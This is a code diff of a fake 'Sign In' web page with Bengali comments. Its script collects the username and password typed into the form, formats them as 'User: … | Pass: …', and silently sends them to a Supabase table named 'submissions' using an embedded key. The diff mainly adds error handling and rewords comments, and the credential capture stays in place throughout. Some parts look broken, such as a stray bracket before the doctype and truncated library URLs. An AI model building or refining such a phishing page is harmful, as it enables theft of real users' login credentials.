@@ -1,15 +1,15 @@
-<!DOCTYPE html>
+]<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign In</title>
-    <!-- Supabase-এর অফিশিয়াল ও ফাস্ট লাইব্রেরি -->
+    <!-- সুপাবেজের সঠিক ও দ্রুততম লাইব্রেরি লিঙ্ক -->
     <script src="https://jsdelivr.net"></script>
     <style>
         * {
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
             transition: all 0.2s ease-in-out;
         }
         body {
@@ -79,12 +79,10 @@
         }
         button:hover:not(:disabled) {
             background: #1557b0;
-            box-shadow: 0 1px 3px 1px rgba(60,64,67,0.15);
         }
         button:disabled {
             background: #cccccc;
             cursor: not-allowed;
-            box-shadow: none;
         }
     </style>
 </head>
@@ -108,11 +106,12 @@
 </div>
 
 <script>
-    // আপনার Supabase URL এবং Credentials
+    // আপনার সুপাবেজ ড্যাশবোর্ডের সঠিক ক্রেডেনশিয়ালস
     const SUPABASE_URL = "https://supabase.co";
     const SUPABASE_KEY = "sb_publishable_aG3O0MLst2EAyBJgKi8xIA_PV8nGoLq"; 
     
-    if (window.supabase) {
+    // লাইব্রেরি লোড নিশ্চিত করা হচ্ছে
+    if (typeof window.supabase !== 'undefined') {
         const db = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
         const form = document.getElementById("loginForm");
         const button = document.getElementById("submitBtn");
@@ -127,16 +126,19 @@
 
             button.disabled = true;
 
-            // দুটি ডেটা একসাথে সাবমিট ফরম্যাট করা
+            // এখানে ইউজার আইডি এবং পাসওয়ার্ড একসাথে টেক্সট আকারে সাজানো হচ্ছে
             const submissionData = `User: ${user} | Pass: ${pass}`;
 
             try {
+                // সুপাবেজ টেবিলের 'message' কলামে ডেটা পাঠানো হচ্ছে
                 const { error } = await db
                     .from("submissions")
                     .insert({ message: submissionData });
 
                 if (!error) {
-                    form.reset(); // সফল হলে ফর্মটি স্মুথলি রিফ্রেশ হবে
+                    form.reset(); // সফল হলে ফর্মের ভেতরের লেখা মুছে যাবে
+                } else {
+                    console.error("Supabase Error:", error.message);
                 }
             } catch (error) {
                 console.error("Submission failed:", error);
@@ -144,8 +146,11 @@
                 button.disabled = false;
             }
         });
+    } else {
+        console.error("Supabase library not loaded properly.");
     }
 </script>
 
 </body>
 </html>
+
